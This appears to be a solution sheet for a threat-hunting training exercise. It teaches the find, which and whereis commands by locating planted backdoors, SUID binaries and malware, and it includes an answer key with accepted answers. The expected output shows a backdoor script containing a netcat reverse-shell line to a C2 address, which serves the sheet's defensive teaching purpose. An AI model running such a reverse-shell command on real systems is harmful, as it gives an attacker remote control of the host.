# CLH-017: Find & Locate - Solution Sheet

**Module:** CLH-017
**Title:** Find & Locate
**Tier:** CLI Specter
**Theme:** Mole hunt - finding hidden files and backdoors

---

## Scenario Overview

You are `hunter@BLACKSITE-7`, a threat hunter investigating a compromised system. A mole has planted trojans and hidden files. Your mission is to use the `find` command and related tools to locate hidden files, SUID backdoors, and other suspicious artifacts.

---

## Objectives & Solutions

### Objective 1: HUNT - Hidden Dot-Files
**Task:** Find hidden dot-files in home directories
**Hint:** `$ find /home -name ".*" -type f`

**Solution:**
```bash
find /home -name ".*" -type f
```

**Expected Output:**
```
/home/hunter/.bashrc
/home/hunter/.bash_history
/home/hunter/.find_cheatsheet
/home/analyst/.bashrc
/home/analyst/.secret_keys
/home/analyst/.backdoor.sh
/home/analyst/.classified
```

**Analysis:** Several hidden files found. The analyst's directory contains suspicious files like `.backdoor.sh` and `.secret_keys`.

---

### Objective 2: LOCATE - SUID Backdoors
**Task:** Find files with SUID permission set
**Hint:** `$ find / -perm -4000 2>/dev/null`

**Solution:**
```bash
find / -perm -4000 2>/dev/null
```
or
```bash
find / -perm -4000
```

**Expected Output:**
```
/home/mole/.local/pwn
/tmp/.cache/rootshell
/var/tmp/privesc
```

**Analysis:** **CRITICAL FINDING!** Three SUID binaries found in unusual locations:
- `/home/mole/.local/pwn` - SUID binary in mole's home
- `/tmp/.cache/rootshell` - SUID backdoor in /tmp (HIGHLY SUSPICIOUS)
- `/var/tmp/privesc` - Privilege escalation tool

These are likely planted by the mole for persistent root access.

---

### Objective 3: SEARCH - Temp Directory Drops
**Task:** Find files dropped in /tmp
**Hint:** `$ find /tmp -type f`

**Solution:**
```bash
find /tmp -type f
```

**Expected Output:**
```
/tmp/.cache/rootshell
/tmp/.hidden/exfil.tar
/tmp/.hidden/keylogger
/tmp/beacon.sh
```

**Analysis:** The /tmp directory contains:
- `rootshell` - SUID backdoor
- `exfil.tar` - Possible exfiltrated data archive
- `keylogger` - Keylogger malware
- `beacon.sh` - C2 beacon script

---

### Objective 4: TRACK - Recent Modifications
**Task:** Find recently modified files
**Hint:** `$ find / -mtime -1 -type f 2>/dev/null`

**Solution:**
```bash
find / -mtime -1 -type f 2>/dev/null
```
or
```bash
find / -mtime -1 -type f
```

**Analysis:** This command finds files modified within the last 24 hours, useful for identifying recently planted malware or modified configurations.

---

### Objective 5: VERIFY - Binary Locations
**Task:** Verify system binary locations
**Hint:** `$ which sudo && whereis bash`

**Solution:**
```bash
which sudo && whereis bash
```
or separately:
```bash
which sudo
whereis bash
```

**Expected Output:**
```
/usr/bin/sudo
bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz
```

**Analysis:** Verifying that critical binaries are in expected locations. If paths differ from expected, could indicate trojanized binaries.

---

## Insight Phase

**Question:** What port does the analyst's backdoor connect to?

**Answer:** `4444`

**Accepted variations:** "4444", "port 4444"

**How to find:** Read the `.backdoor.sh` file in `/home/analyst`:
```bash
cat /home/analyst/.backdoor.sh
```

**Expected Content:**
```bash
#!/bin/bash
# TROJAN - Reverse shell to mole C2
nc -e /bin/bash 10.0.0.88 4444
```

**Analysis:** The backdoor uses netcat (`nc`) with the `-e` flag to spawn a reverse shell connecting to the mole's C2 server at `10.0.0.88` on port `4444`.

---

## Key Findings Summary

| Location | Finding | Severity |
|----------|---------|----------|
| `/home/analyst/.backdoor.sh` | Reverse shell to 10.0.0.88:4444 | **CRITICAL** |
| `/tmp/.cache/rootshell` | SUID backdoor in /tmp | **CRITICAL** |
| `/var/tmp/privesc` | Privilege escalation tool | **HIGH** |
| `/home/mole/.local/pwn` | SUID binary in user home | **HIGH** |
| `/tmp/beacon.sh` | C2 beacon script | **HIGH** |
| `/tmp/.hidden/keylogger` | Keylogger malware | **HIGH** |
| `/home/analyst/.secret_keys` | Exposed credentials | **MEDIUM** |

---

## Find Command Reference

### Find by Name
```bash
find /path -name "filename"       # Exact match
find /path -name "*.log"          # Wildcard
find /path -name ".*"             # Hidden files
find /path -iname "file"          # Case-insensitive
```

### Find by Type
```bash
find /path -type f                # Regular files
find /path -type d                # Directories
find /path -type l                # Symbolic links
```

### Find by Permissions
```bash
find / -perm -4000                # SUID files
find / -perm -2000                # SGID files
find / -perm -6000                # SUID and SGID
find / -perm -o+w                 # World-writable
```

### Find by Time
```bash
find / -mtime -1                  # Modified in last 24h
find / -mtime +30                 # Modified 30+ days ago
find / -atime -7                  # Accessed in last week
find / -newer /etc/passwd         # Newer than reference
```

### Locate Commands
```bash
locate filename                   # Fast index search
whereis command                   # Find binary/man pages
which command                     # Find executable path
```

---

## IOCs (Indicators of Compromise)

| IOC Type | Value |
|----------|-------|
| C2 Server | 10.0.0.88:4444 |
| Backdoor | /home/analyst/.backdoor.sh |
| SUID Backdoor | /tmp/.cache/rootshell |
| SUID Backdoor | /var/tmp/privesc |
| SUID Backdoor | /home/mole/.local/pwn |
| Beacon | /tmp/beacon.sh |
| Keylogger | /tmp/.hidden/keylogger |
| Exfil Archive | /tmp/.hidden/exfil.tar |
| Staging Area | /home/mole/.exfil_staging/ |
| Suspect User | mole |

---

*Last Updated: February 2, 2026*
